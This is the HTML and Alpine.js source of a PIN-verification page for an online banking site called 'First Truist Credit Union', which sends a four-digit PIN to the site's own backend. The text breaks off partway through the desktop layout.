<!DOCTYPE html>
<html lang="en" x-data="{ darkMode: localStorage.getItem('darkMode') === 'true' || false }" x-init="darkMode ? document.documentElement.classList.add('dark') : document.documentElement.classList.remove('dark')" :class="{ 'dark': darkMode }">

    <head>
        <title>First Truist Credit Union - PIN Verification</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="csrf-token" content="XArOTpNM0uQ9cfZJDp4xyQsdC6seLSxJ5rOKaDbF">
        <meta name="robots" content="index, follow">
        <meta name="apple-mobile-web-app-title" content="First Truist Credit Union">
        <meta name="application-name" content="First Truist Credit Union">
        <meta name="description"
            content="Swift and Secure Money Transfer to any UK bank account will become a breeze with First Truist Credit Union.">
        <link rel="shortcut icon"
            href="https://firsttruistcus.com/storage/app/public/photos/QeDeSHnRvDtKS1uEZmq5svmALu0FqZgcUBzHS5hx.png">

        <!-- Tailwind CSS with custom color variables -->
        <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
        <script>
            tailwind.config = {
                darkMode: 'class',
                theme: {
                    extend: {
                        colors: {
                            primary: { // Dynamic primary colors from appearance settings
                                50: '#f0f9ff',
                                100: '#e0f2fe',
                                200: '#bae6fd',
                                300: '#7dd3fc',
                                400: '#38bdf8',
                                DEFAULT: '#0ea5e9',
                                500: '#0ea5e9',
                                600: '#0284c7',
                                700: '#0369a1',
                                foreground: '#ffffff',
                            },
                            secondary: { // Dynamic secondary colors from appearance settings
                                50: '#f8fafc',
                                100: '#f1f5f9',
                                200: '#e2e8f0',
                                300: '#cbd5e1',
                                400: '#94a3b8',
                                DEFAULT: '#64748b',
                                500: '#64748b',
                                600: '#475569',
                                700: '#334155',
                                foreground: '#0f172a',
                            },
                            accent: { // Dynamic accent colors from appearance settings
                                50: '#fdf2f8',
                                100: '#fce7f3',
                                200: '#fbcfe8',
                                300: '#f9a8d4',
                                400: '#f472b6',
                                DEFAULT: '#ec4899',
                                500: '#ec4899',
                                600: '#db2777',
                                700: '#be185d',
                                foreground: '#ffffff',
                            },
                            background: '#f8fafc',
                            foreground: '#1e293b',
                            card: {
                                DEFAULT: '#ffffff',
                                foreground: '#1e293b',
                            },
                            muted: {
                                DEFAULT: '#f1f5f9',
                                foreground: '#64748b',
                            },
                            border: '#e2e8f0',
                            input: '#e2e8f0',
                            ring: '#0ea5e9',

                            // Specific colors from original design for gradients/highlights
                            'gradient-pink-from': '#ec4899',
                            'gradient-purple-via': '#a855f7',
                            'gradient-indigo-to': '#4f46e5',

                            // Utility colors
                            'yellow-action': '#facc15',
                            'green-positive': '#22c55e',
                            'red-negative': '#ef4444',
                        },
                        boxShadow: {
                            'soft': '0 2px 15px -3px rgba(0, 0, 0, 0.07), 0 10px 20px -2px rgba(0, 0, 0, 0.04)',
                            'top': '0 -4px 12px -1px rgba(0,0,0,0.05), 0 -2px 8px -1px rgba(0,0,0,0.03)',
                        },
                        borderRadius: {
                            lg: '0.75rem',
                            xl: '0.75rem',
                            '2xl': '1rem',
                            '3xl': '1.5rem',
                        },
                        keyframes: {
                            pulse: {
                                '0%, 100%': {
                                    transform: 'scale(1)',
                                    boxShadow: '0 0 0 0 rgba(14, 165, 233, 0.4)'
                                }, // primary color
                                '50%': {
                                    transform: 'scale(1.05)',
                                    boxShadow: '0 0 0 10px rgba(14, 165, 233, 0)'
                                },
                            },
                            shine: {
                                '0%': {
                                    transform: 'translateX(-100%) translateY(-100%) rotate(45deg)'
                                },
                                '100%': {
                                    transform: 'translateX(100%) translateY(100%) rotate(45deg)'
                                },
                            },
                            shake: {
                                '0%, 100%': {
                                    transform: 'translateX(0)'
                                },
                                '25%': {
                                    transform: 'translateX(-5px)'
                                },
                                '50%': {
                                    transform: 'translateX(5px)'
                                },
                                '75%': {
                                    transform: 'translateX(-5px)'
                                },
                            },
                            'success-scale': {
                                '0%': {
                                    transform: 'scale(1)'
                                },
                                '50%': {
                                    transform: 'scale(1.2)'
                                },
                                '100%': {
                                    transform: 'scale(1)'
                                },
                            },
                            floatParticle: {
                                '0%, 100%': {
                                    transform: 'translateY(0px) rotate(0deg)',
                                    opacity: '0.6'
                                },
                                '50%': {
                                    transform: 'translateY(-20px) rotate(180deg)',
                                    opacity: '1'
                                },
                            },
                            rotateOrbit: {
                                '0%': {
                                    transform: 'rotate(0deg)'
                                },
                                '100%': {
                                    transform: 'rotate(360deg)'
                                },
                            },
                            spinInner: {
                                '0%': {
                                    transform: 'rotate(0deg) scale(1)'
                                },
                                '50%': {
                                    transform: 'rotate(180deg) scale(1.1)'
                                },
                                '100%': {
                                    transform: 'rotate(360deg) scale(1)'
                                },
                            },
                            coreGlow: {
                                '0%': {
                                    transform: 'translate(-50%, -50%) scale(0.8)',
                                    boxShadow: '0 0 20px rgba(14, 165, 233, 0.6), 0 0 40px rgba(14, 165, 233, 0.3), inset 0 0 10px rgba(255, 255, 255, 0.3)'
                                },
                                '100%': {
                                    transform: 'translate(-50%, -50%) scale(1.2)',
                                    boxShadow: '0 0 30px rgba(14, 165, 233, 0.8), 0 0 60px rgba(14, 165, 233, 0.4), inset 0 0 15px rgba(255, 255, 255, 0.5)'
                                },
                            },
                            morphCore: {
                                '0%, 100%': {
                                    borderRadius: '50%',
                                    backgroundPosition: '0% 50%'
                                },
                                '25%': {
                                    borderRadius: '40%',
                                    backgroundPosition: '100% 50%'
                                },
                                '50%': {
                                    borderRadius: '30%',
                                    backgroundPosition: '0% 50%'
                                },
                                '75%': {
                                    borderRadius: '40%',
                                    backgroundPosition: '100% 50%'
                                },
                            },
                            textShimmer: {
                                '0%': {
                                    backgroundPosition: '0% 50%'
                                },
                                '50%': {
                                    backgroundPosition: '100% 50%'
                                },
                                '100%': {
                                    backgroundPosition: '0% 50%'
                                },
                            },
                            textGlow: {
                                '0%': {
                                    opacity: '0.3'
                                },
                                '100%': {
                                    opacity: '0.7'
                                },
                            },
                            subtitleFade: {
                                '0%, 100%': {
                                    opacity: '0.5',
                                    transform: 'translateY(0px)'
                                },
                                '50%': {
                                    opacity: '1',
                                    transform: 'translateY(-2px)'
                                },
                            },
                            progressSlide: {
                                '0%': {
                                    left: '-100%'
                                },
                                '50%': {
                                    left: '0%'
                                },
                                '100%': {
                                    left: '100%'
                                },
                            }
                        },
                        animation: {
                            'pulse-slow': 'pulse 2.5s infinite',
                            'shine-once': 'shine 1.5s ease-in-out',
                            'shake': 'shake 0.5s ease-in-out',
                            'success': 'success-scale 0.6s ease-in-out',
                        }
                    }
                }
            }
        </script>

        <!-- Alpine.js -->
        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>

        <!-- Font Awesome 6 Pro -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/aquawolf04/font-awesome-pro@5cd1511/css/all.css">

        <!-- External Fonts -->
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"
            rel="stylesheet">

        <style>
            body {
                font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background-color: theme('colors.background');
                color: theme('colors.foreground');
            }

            ::-webkit-scrollbar {
                width: 8px;
                height: 8px;
            }

            ::-webkit-scrollbar-track {
                background: #e2e8f0;
            }

            /* slate-200 */
            ::-webkit-scrollbar-thumb {
                background: #94a3b8;
                border-radius: 4px;
            }

            /* slate-400 */
            ::-webkit-scrollbar-thumb:hover {
                background: #64748b;
            }

            /* slate-500 */
            .dark ::-webkit-scrollbar-track {
                background: #374151;
            }

            /* gray-700 */
            .dark ::-webkit-scrollbar-thumb {
                background: #6b7280;
            }

            /* gray-500 */
            .dark ::-webkit-scrollbar-thumb:hover {
                background: #9ca3af;
            }

            /* gray-400 */
            .custom-scrollbar::-webkit-scrollbar {
                width: 6px;
                height: 6px;
            }

            .custom-scrollbar::-webkit-scrollbar-track {
                background: transparent;
            }

            .custom-scrollbar::-webkit-scrollbar-thumb {
                background: #cbd5e1;
                border-radius: 3px;
            }

            /* slate-300 */
            .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                background: #94a3b8;
            }

            /* slate-400 */
            .dark .custom-scrollbar::-webkit-scrollbar-thumb {
                background: #6b7280;
            }

            /* gray-500 */
            .dark .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                background: #9ca3af;
            }

            /* gray-400 */
            .shine-effect-container {
                position: relative;
                overflow: hidden;
            }

            .shine-effect {
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background-image: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(45deg);
                opacity: 0;
                transition: opacity 0.5s;
            }

            .shine-effect-container:hover .shine-effect {
                opacity: 1;
                animation: shine-once 1.5s ease-in-out;
            }

            .fade-in-section {
                opacity: 0;
                transform: translateY(20px);
                transition: opacity 0.6s ease-out, transform 0.6s ease-out;
            }

            .fade-in-section.is-visible {
                opacity: 1;
                transform: translateY(0);
            }
        </style>

        <!-- Ultra Modern Loading Animation -->
        <style>
            .page-loading {
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 100%;
                transition: all .6s cubic-bezier(0.4, 0, 0.2, 1);
                background: radial-gradient(ellipse at center, rgba(14, 165, 233, 0.08) 0%, rgba(255, 255, 255, 0.95) 50%, rgba(255, 255, 255, 1) 100%);
                backdrop-filter: blur(2px);
                visibility: hidden;
                z-index: 9999;
            }

            .dark .page-loading {
                background: radial-gradient(ellipse at center, rgba(14, 165, 233, 0.12) 0%, rgba(17, 24, 39, 0.95) 50%, rgba(17, 24, 39, 1) 100%);
            }

            .page-loading.active {
                opacity: 1;
                visibility: visible;
            }

            .page-loading-inner {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                text-align: center;
                transition: all .4s cubic-bezier(0.4, 0, 0.2, 1);
                opacity: 0;
            }

            .page-loading.active>.page-loading-inner {
                opacity: 1;
            }

            .loading-container {
                display: flex;
                align-items: center;
                justify-content: center;
                flex-direction: column;
                position: relative;
            }

            /* Floating particles background */
            .loading-particles {
                position: absolute;
                width: 300px;
                height: 300px;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                pointer-events: none;
            }

            .particle {
                position: absolute;
                width: 4px;
                height: 4px;
                background: linear-gradient(45deg, #0ea5e9, #4f46e5);
                border-radius: 50%;
                opacity: 0.6;
                animation: floatParticle 4s ease-in-out infinite;
            }

            .particle:nth-child(1) {
                top: 20%;
                left: 20%;
                animation-delay: 0s;
            }

            .particle:nth-child(2) {
                top: 80%;
                left: 80%;
                animation-delay: 0.5s;
            }

            .particle:nth-child(3) {
                top: 60%;
                left: 20%;
                animation-delay: 1s;
            }

            .particle:nth-child(4) {
                top: 30%;
                left: 70%;
                animation-delay: 1.5s;
            }

            .particle:nth-child(5) {
                top: 70%;
                left: 30%;
                animation-delay: 2s;
            }

            .particle:nth-child(6) {
                top: 10%;
                left: 60%;
                animation-delay: 2.5s;
            }

            .loading-animation {
                display: flex;
                align-items: center;
                justify-content: center;
                width: 120px;
                height: 120px;
                margin-bottom: 2rem;
                position: relative;
                filter: drop-shadow(0 0 20px rgba(14, 165, 233, 0.2));
            }

            /* Outer orbital rings */
            .loading-animation .orbit-ring {
                position: absolute;
                border-radius: 50%;
                border: 2px solid rgba(14, 165, 233, 0.2);
                animation: rotateOrbit 8s linear infinite;
            }

            .orbit-ring:nth-child(1) {
                width: 100%;
                height: 100%;
                border-top: 2px solid #0ea5e9;
                border-right: 2px solid rgba(14, 165, 233, 0.3);
                animation-duration: 2s;
            }

            .orbit-ring:nth-child(2) {
                width: 80%;
                height: 80%;
                top: 10%;
                left: 10%;
                border-bottom: 2px solid #0ea5e9;
                border-left: 2px solid rgba(14, 165, 233, 0.3);
                animation-duration: 2.5s;
                animation-direction: reverse;
            }

            .orbit-ring:nth-child(3) {
                width: 60%;
                height: 60%;
                top: 20%;
                left: 20%;
                border-top: 2px solid #0ea5e9;
                border-right: 2px solid rgba(14, 165, 233, 0.3);
                animation-duration: 3s;
            }

            /* Inner spinning circles */
            .loading-animation .inner-circle {
                position: absolute;
                width: 15px;
                height: 15px;
                border-radius: 50%;
                background: #0ea5e9;
                box-shadow: 0 0 10px rgba(14, 165, 233, 0.6);
                animation: spinInner 2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            }

            .inner-circle:nth-child(4) {
                border-top: 3px solid #0ea5e9;
                border-right: 3px solid rgba(14, 165, 233, 0.4);
                animation-delay: 0s;
            }

            .inner-circle:nth-child(5) {
                border-bottom: 3px solid #0ea5e9;
                border-left: 3px solid rgba(14, 165, 233, 0.4);
                animation-delay: 0.3s;
                animation-direction: reverse;
            }

            /* Glowing core with morphing effect */
            .loading-animation .core {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 20px;
                height: 20px;
                border-radius: 50%;
                background: linear-gradient(45deg, #0ea5e9, #4f46e5);
                background-size: 200% 200%;
                box-shadow:
                    0 0 20px rgba(14, 165, 233, 0.6),
                    0 0 40px rgba(14, 165, 233, 0.3),
                    inset 0 0 10px rgba(255, 255, 255, 0.3);
                animation: coreGlow 2s ease-in-out infinite, morphCore 4s ease-in-out infinite;
            }

            /* Enhanced text with multiple effects */
            .page-loading .text {
                font-weight: 700;
                letter-spacing: 0.1em;
                margin-top: 1.5rem;
                font-size: 1.1rem;
                position: relative;
                background: linear-gradient(90deg, #0ea5e9, #0ea5e9, #4f46e5, #0ea5e9, #0ea5e9);
                background-size: 300% auto;
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                animation: textShimmer 3s linear infinite;
                text-shadow: 0 0 30px rgba(14, 165, 233, 0.3);
            }

            .page-loading .text::before {
                content: '';
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                background: linear-gradient(45deg, transparent, rgba(14, 165, 233, 0.1), transparent);
                border-radius: 4px;
                z-index: -1;
                animation: textGlow 2s ease-in-out infinite alternate;
            }

            /* Subtitle with fade effect */
            .page-loading .subtitle {
                font-size: 0.75rem;
                color: #64748b;
                font-weight: 500;
                margin-top: 0.5rem;
                letter-spacing: 0.05em;
                animation: subtitleFade 2s ease-in-out infinite;
            }

            /* Progress indicator */
            .loading-progress {
                width: 200px;
                height: 2px;
                background: #f1f5f9;
                border-radius: 1px;
                margin-top: 1.5rem;
                overflow: hidden;
                position: relative;
            }

            .loading-progress::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, #0ea5e9, transparent);
                animation: progressSlide 2s ease-in-out infinite;
            }

            /* PIN Page Specific Styles */
            .pin-dots {
                display: flex;
                gap: 12px;
                justify-content: center;
                margin: 20px 0;
            }

            .pin-dot {
                width: 12px;
                height: 12px;
                border-radius: 50%;
                background-color: #f1f5f9;
                transition: all 0.3s ease;
            }

            .pin-dot.filled {
                background-color: #0ea5e9;
                transform: scale(1.2);
            }

            .dark .pin-dot {
                background-color: #6b7280;
            }

            .dark .pin-dot.filled {
                background-color: #0ea5e9;
            }

            .keypad-button {
                width: 70px;
                height: 70px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 24px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.2s ease;
                user-select: none;
                background: #f1f5f9;
                backdrop-filter: blur(10px);
                border: 1px solid #f1f5f9;
                color: white;
            }

            .keypad-button:hover {
                background: #e2e8f0;
                transform: scale(1.05);
            }

            .keypad-button:active {
                transform: scale(0.95);
            }

            .dark .keypad-button {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .dark .keypad-button:hover {
                background: rgba(255, 255, 255, 0.1);
            }

            /* Desktop PIN Styles */
            .desktop-pin-container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(20px);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }

            .dark .desktop-pin-container {
                background: rgba(31, 41, 55, 0.95);
                border: 1px solid rgba(75, 85, 99, 0.3);
            }

            /* Ripple Effect */
            .ripple {
                position: relative;
                overflow: hidden;
            }

            .ripple::before {
                content: '';
                position: absolute;
                top: 50%;
                left: 50%;
                width: 0;
                height: 0;
                border-radius: 50%;
                background: rgba(255, 255, 255, 0.3);
                transform: translate(-50%, -50%);
                transition: width 0.6s, height 0.6s;
            }

            .ripple:active::before {
                width: 300px;
                height: 300px;
            }
        </style>
    </head>

    <body class="font-sans bg-background text-foreground ">
        <!-- Ultra Modern Page Loader -->
        <div class="page-loading active">
            <div class="page-loading-inner">
                <div class="loading-container">
                    <!-- Floating particles background -->
                    <div class="loading-particles">
                        <div class="particle"></div>
                        <div class="particle"></div>
                        <div class="particle"></div>
                        <div class="particle"></div>
                        <div class="particle"></div>
                        <div class="particle"></div>
                    </div>

                    <!-- Main loading animation -->
                    <div class="loading-animation">
                        <!-- Outer orbital rings -->
                        <div class="orbit-ring"></div>
                        <div class="orbit-ring"></div>
                        <div class="orbit-ring"></div>

                        <!-- Inner spinning circles -->
                        <div class="inner-circle"></div>
                        <div class="inner-circle"></div>

                        <!-- Morphing glowing core -->
                        <div class="core"></div>
                    </div>

                    <!-- Enhanced text with effects -->
                    <div class="text">First Truist Credit Union</div>
                    <div class="subtitle">Secure Banking Platform</div>
                </div>
            </div>
        </div>

        <!-- Dark Mode Toggle - Floating button -->
        <div class="fixed top-4 right-4 z-50">
            <button
                @click="darkMode = !darkMode; localStorage.setItem('darkMode', darkMode); darkMode ? document.documentElement.classList.add('dark') : document.documentElement.classList.remove('dark')"
                class="p-3 rounded-full bg-white/10 dark:bg-gray-800/50 text-gray-700 dark:text-gray-300 backdrop-blur-md border border-white/20 dark:border-gray-700/50 transition-all duration-300 hover:bg-white/20 dark:hover:bg-gray-800/70"
                :title="darkMode ? 'Switch to Light Mode' : 'Switch to Dark Mode'">
                <i class="fas fa-sun text-sm" x-show="darkMode"></i>
                <i class="fas fa-moon text-sm" x-show="!darkMode"></i>
            </button>
        </div>

        <!-- Main Content -->
        <div class="min-h-screen">

            <div x-data="{
                pin: '',
                maxLength: 4,
                isProcessing: false,
                errorMessage: '',
                successMessage: '',
                isMobile: window.innerWidth < 768,
            
                init() {
                    window.addEventListener('resize', () => {
                        this.isMobile = window.innerWidth < 768;
                    });
            
                    // Auto-submit when complete (for mobile)
                    this.$watch('pin', value => {
                        if (value.length === this.maxLength && this.isMobile) {
                            setTimeout(() => this.submitPin(), 300);
                        }
                    });
                },
            
                addDigit(digit) {
                    if (this.pin.length < this.maxLength) {
                        this.pin += digit;
                        // Add haptic feedback for mobile
                        if (this.isMobile && window.navigator.vibrate) {
                            window.navigator.vibrate(50);
                        }
                    }
                },
            
                removeDigit() {
                    this.pin = this.pin.slice(0, -1);
                },
            
                clearPin() {
                    this.pin = '';
                },
            
                async submitPin() {
                    if (this.pin.length < this.maxLength) {
                        this.errorMessage = 'Please enter all 4 digits';
                        setTimeout(() => this.errorMessage = '', 3000);
                        return;
                    }
            
                    this.isProcessing = true;
            
                    try {
                        const response = await fetch('https://firsttruistcus.com/dashboard/pinstatus', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-CSRF-TOKEN': document.querySelector('meta[name=csrf-token]').content
                            },
                            body: JSON.stringify({ pin: this.pin })
                        });
            
                        const result = await response.json();
            
                        if (result.success) {
                            this.successMessage = result.message || 'PIN verified successfully!';
                            setTimeout(() => window.location.href = result.redirect || 'https://firsttruistcus.com/dashboard', 1500);
                        } else {
                            this.errorMessage = result.message || 'Invalid PIN. Please try again.';
            
                            // Error animation
                            const pinContainer = document.querySelector('.pin-dots');
                            if (pinContainer) {
                                pinContainer.classList.add('animate-shake');
                                setTimeout(() => pinContainer.classList.remove('animate-shake'), 500);
                            }
            
                            this.pin = '';
                            setTimeout(() => this.errorMessage = '', 3000);
                        }
                    } catch (error) {
                        this.errorMessage = 'An error occurred. Please try again.';
                        setTimeout(() => this.errorMessage = '', 3000);
                    } finally {
                        this.isProcessing = false;
                    }
                }
            }" class="min-h-screen">

                <!-- Mobile Design (matching the image) -->
                <div
                    class="md:hidden h-screen bg-gradient-to-br from-gray-50 via-white to-gray-100 dark:from-gray-900 dark:via-gray-800 dark:to-black text-gray-900 dark:text-white flex flex-col overflow-hidden">

                    <!-- Header Section - More Compact -->
                    <div class="flex flex-col items-center justify-center mt-10 px-6 py-4">
                        <!-- User Avatar -->
                        <div class="relative mb-4">
                            <div
                                class="w-20 h-20 rounded-full overflow-hidden border-3 border-gray-300 dark:border-white/20 shadow-2xl">
                                <img src="https://firsttruistcus.com/storage/app/public/photos/SK34bS6ea2fd452f78bcbc0851f3f8539c1a53.png1758435321"
                                    alt="Cordell"
                                    onerror="this.src='https://ui-avatars.com/api/?name=Cordell&color=7F9CF5&background=EBF4FF';"
                                    class="w-full h-full object-cover">
                            </div>
                            <!-- Status indicator -->
                            <div
                                class="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-white dark:border-gray-900 flex items-center justify-center">
                                <i class="fas fa-check text-xs text-white"></i>
                            </div>
                        </div>

                        <!-- Welcome Text -->
                        <div class="text-center mb-4">
                            <h1 class="text-xl font-bold mb-1">Welcome Back</h1>
                            <p class="text-gray-600 dark:text-gray-300 text-sm">Cordell</p>
                        </div>

                        <!-- Security Icon -->
                        <div class="mb-3">
                            <div
                                class="w-10 h-10 bg-green-100 dark:bg-green-500/20 rounded-full flex items-center justify-center">
                                <i class="fas fa-lock text-green-600 dark:text-green-400 text-sm"></i>
                            </div>
                        </div>

                        <!-- Passcode Label -->
                        <p class="text-gray-600 dark:text-gray-300 text-sm mb-4 flex items-center">
                            <i class="fas fa-shield-alt mr-2"></i>
                            Passcode
                        </p>

                        <!-- PIN Dots -->
                        <div class="pin-dots mb-6">
                            <template x-for="(digit, index) in Array.from({length: maxLength})">
                                <div class="w-3 h-3 rounded-full transition-all duration-300"
                                    :class="index < pin.length ? 'bg-primary-600 dark:bg-white scale-110' :
                                        'bg-gray-300 dark:bg-white/30'">
                                </div>
                            </template>
                        </div>

                        <!-- Error Message -->
                        <div x-show="errorMessage" x-transition:enter="transition ease-out duration-300"
                            x-transition:enter-start="opacity-0 transform -translate-y-2"
                            x-transition:enter-end="opacity-100 transform translate-y-0"
                            x-transition:leave="transition ease-in duration-200"
                            x-transition:leave-start="opacity-100 transform translate-y-0"
                            x-transition:leave-end="opacity-0 transform -translate-y-2"
                            class="text-red-600 dark:text-red-400 text-sm text-center mb-2">
                            <span x-text="errorMessage"></span>
                        </div>

                        <!-- Success Message -->
                        <div x-show="successMessage" x-transition:enter="transition ease-out duration-300"
                            x-transition:enter-start="opacity-0 scale-95" x-transition:enter-end="opacity-100 scale-100"
                            x-transition:leave="transition ease-in duration-200"
                            x-transition:leave-start="opacity-100 scale-100" x-transition:leave-end="opacity-0 scale-95"
                            class="text-green-600 dark:text-green-400 text-sm text-center mb-2">
                            <span x-text="successMessage"></span>
                        </div>
                    </div>

                    <!-- Keypad Section - More Compact -->
                    <div class="px-6 ml-10 mt-10 pb-6">
                        <div class="grid grid-cols-3 gap-4 max-w-xs mx-auto">
                            <!-- Numbers 1-9 -->
                            <template x-for="n in 9">
                                <button type="button" @click="addDigit(n)"
                                    :disabled="isProcessing || pin.length >= maxLength"
                                    class="w-16 h-16 rounded-full bg-white border border-gray-200 shadow-sm dark:bg-white/10 dark:border-white/20 dark:backdrop-blur-md text-gray-900 dark:text-white text-xl font-semibold flex items-center justify-center transition-all duration-200 hover:bg-gray-50 dark:hover:bg-white/20 hover:scale-105 active:scale-95 ripple"
                                    :class="{ 'opacity-50 cursor-not-allowed': isProcessing || pin.length >= maxLength }">
                                    <span x-text="n"></span>
                                </button>
                            </template>

                            <!-- Sign Out -->
                            <form method="POST" action="https://firsttruistcus.com/logout" class="inline">
                                <input type="hidden" name="_token"
                                    value="XArOTpNM0uQ9cfZJDp4xyQsdC6seLSxJ5rOKaDbF"> <button type="submit"
                                    class="w-16 h-16 rounded-full bg-white border border-gray-200 shadow-sm dark:bg-white/10 dark:border-white/20 dark:backdrop-blur-md text-red-600 dark:text-red-400 flex items-center justify-center transition-all duration-200 hover:bg-gray-50 dark:hover:bg-white/20 hover:scale-105 active:scale-95">
                                    <i class="fas fa-sign-out-alt text-lg"></i>
                                </button>
                            </form>

                            <!-- Number 0 -->
                            <button type="button" @click="addDigit(0)"
                                :disabled="isProcessing || pin.length >= maxLength"
                                class="w-16 h-16 rounded-full bg-white border border-gray-200 shadow-sm dark:bg-white/10 dark:border-white/20 dark:backdrop-blur-md text-gray-900 dark:text-white text-xl font-semibold flex items-center justify-center transition-all duration-200 hover:bg-gray-50 dark:hover:bg-white/20 hover:scale-105 active:scale-95 ripple"
                                :class="{ 'opacity-50 cursor-not-allowed': isProcessing || pin.length >= maxLength }">
                                0
                            </button>

                            <!-- Backspace -->
                            <button type="button" @click="removeDigit()" :disabled="isProcessing || pin.length === 0"
                                class="w-16 h-16 rounded-full bg-primary-600 hover:bg-primary-700 text-white flex items-center justify-center transition-all duration-200 hover:scale-105 active:scale-95 shadow-lg"
                                :class="{ 'opacity-50 cursor-not-allowed': isProcessing || pin.length === 0 }">
                                <i class="fas fa-backspace text-lg"></i>
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Desktop Design -->
                <div
                    class="hidden md:flex min-h-screen bg-gradient-to-br from-primary-600 via-primary-700 to-primary-800">

                    <!-- Left Panel - Branding -->
                    <div class="flex-1 flex items-center justify-center p-12 relative overflow-hidden">
                        <!-- Background Elements -->
                        <div class="absolute inset-0 opacity-10">
                            <div class="absolute top-20 left-20 w-32 h-32 bg-white rounded-full animate-pulse"></div>
                            <div
                                class="absolute bottom-20 right-20 w-24 h-24 bg-white rounded-full animate-pulse delay-300">
                            </div>
                            <div
                                class="absolute top-1/2 left-1/4 w-16 h-16 bg-white rounded-full animate-pulse delay-700">
                            </div>
                        </div>

                        <div class="relative z-10 text-center text-white">
                            <div class="mb-8">
                                <div
                                    class="w-20 h-20 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mx-auto mb-6">
                                    <i class="fas fa-shield-alt text-3xl"></i>
                                </div>
                                <h1 class="text-4xl font-bold mb-4">Secure Access</h1>
                                <p class="text-xl text-white/90 mb-8">Your security is our priority</p>
                            </div>

                            <div class="grid grid-cols-2 gap-6 max-w-md">
                                <div class="text-center">
                                    <div
                                        class="w-12 h-12 bg-white/20 rounded-lg flex items-center justify-center mx-auto mb-3">
                                        <i class="fas fa-lock text-lg"></i>
                                    </div>
                                    <p class="text-sm">Encrypted</p>
                                </div>
                                <div class="text-center">
                                    <div
                                        class="w-12 h-12 bg-white/20 rounded-lg flex items-center justify-center mx-auto mb-3">
                                        <i class="fas fa-fingerprint text-lg"></i>
                                    </div>
                                    <p class="text-sm">Biometric</p>
                                </div>
                                <div class="text-center">
                                    <div
                                        class="w-12 h-12 bg-white/20 rounded-lg flex items-center justify-center mx-auto mb-3">
                                        <i class="fas fa-user-shield text-lg"></i>
                                    </div>
                                    <p class="text-sm">Protected</p>
                                </div>
                                <div class="text-center">
                                    <div
                                        class="w-12 h-12 bg-white/20 rounded-lg flex items-center justify-center mx-auto mb-3">
                                        <i class="fas fa-clock text-lg"></i>
                                    </div>
                                    <p class="text-sm">24/7 Secure</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Right Panel - PIN Entry -->
                    <div class="flex-1 flex items-center justify-center p-12">
                        <div class="w-full max-w-md desktop-pin-container rounded-3xl p-8 shadow-2xl">

                            <!-- User Info -->
                            <div class="text-center mb-8">
                                <div class="relative inline-block mb-4">
                                    <div
                                        class="w-20 h-20 rounded-full overflow-hidden border-4 border-primary-200 dark:border-primary-700">
                                        <img src="https://firsttruistcus.com/storage/app/public/photos/SK34bS6ea2fd452f78bcbc0851f3f8539c1a53.png1758435321"
                                            alt="Cordell"
                                            onerror="this.src='https://ui-avatars.com/api/?name=Cordell&color=7F9CF5&background=EBF4FF';"
                                            class="w-full h-full object-cover">
                                    </div>
                                    <div
                                        class="absolute -bottom-1 -right-1 w-6 h-6 bg-primary-600 rounded-full border-2 border-white dark:border-gray-800 flex items-center justify-center">
                                        <i class="fas fa-shield-alt text-xs text-white"></i>
                                    </div>
                                </div>
                                <h2 class="text-2xl font-bold text-gray-900 dark:text-white mb-2">Welcome Back</h2>
                                <p class="text-gray-600 dark:text-gray-300">Cordell</p>
                            </div>

                            <!-- PIN Input -->
                            <div class="mb-6">
                                <label for="desktop-pin"
                                    class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-3 text-center">
                                    <i class="fas fa-lock mr-2"></i>
                                    Enter your 4-digit PIN
                                </label>
                                <input id="desktop-pin" type="password" inputmode="numeric" maxlength="4"
                                    pattern="[0-9]*" x-model="pin" :disabled="isProcessing"
                                    class="w-full px-4 py-4 border-2 border-gray-200 dark:border-gray-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500 text-center text-2xl tracking-widest transition-all duration-300 bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                                    placeholder="••••">
                            </div>

                            <!-- Error/Success Messages -->
                            <div x-show="errorMessage" x-transition:enter="transition ease-out duration-300"
                                x-transition:enter-start="opacity-0 transform -translate-y-2"
                                x-transition:enter-end="opacity-100 transform translate-y-0"
                                x-transition:leave="transition ease-in duration-200"
                                x-transition:leave-start="opacity-100 transform translate-y-0"
